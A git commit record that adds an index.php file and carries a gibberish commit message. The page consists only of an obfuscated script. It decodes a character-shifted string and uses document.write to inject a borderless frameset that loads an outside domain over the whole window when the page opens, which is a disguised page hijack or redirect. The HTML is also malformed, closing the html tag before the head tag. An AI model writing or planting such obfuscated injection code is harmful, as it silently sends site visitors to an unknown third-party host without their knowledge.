6ec34cecfb446d7ea20f2d86ee388d55d368c31e
AnonPrixorPH <62997139+AnonPrixorPH@users.noreply.github.com>
2021-04-29 02:52:05 +0800

    mwizojehj
    aoisucb

---
+++ index.php
@@ -0,0 +1,5 @@
+<html>
+<head>
+<script>var s="=gsbnftfu!spxt>#+-5#!gsbnfcpsefs>#ZFT#!cpsefs>#59#!gsbnftqbdjoh>#1#?=gsbnf!gsbnfcpsefs>#1#!tsd>#iuuq;00cppuzpv/nm#!tdspmmjoh>#zft#!opsftj{f>#2#!0?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script>
+</html>
+</head>
